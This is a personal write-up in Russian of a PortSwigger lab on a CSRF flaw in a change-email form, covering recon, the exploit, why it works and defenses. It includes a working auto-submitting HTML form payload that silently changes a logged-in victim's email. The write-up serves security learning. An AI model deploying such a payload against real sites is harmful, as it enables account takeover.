# Lab: CSRF vulnerability with no defenses

**Ссылка:** https://portswigger.net/web-security/csrf/lab-no-defenses
**Статус:** ✅ Solved
**Дата:** 2026-10-11

## Что уязвимо

Форма смены email в `/my-account/change-email` не имеет CSRF-токена и не проверяет Origin/Referer.

## Разведка

1. Залогинился как `wiener:peter`.
2. Отправил форму смены email.
3. В Burp HTTP history нашёл запрос `POST /my-account/change-email` с телом `email=...`.
4. Убедился: CSRF-токена нет, проверки Origin/Referer нет.

## Эксплойт

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>

## Почему сработало

- Браузер жертвы автоматически приложил сессионную куку к запросу на домен лабы.
- Сервер не отличил запрос с exploit-server от легитимного.

## Защита

- CSRF-токен в форме.
- Проверка `Origin` / `Referer`.
- Кука с флагом `SameSite=Strict` или `Lax`.
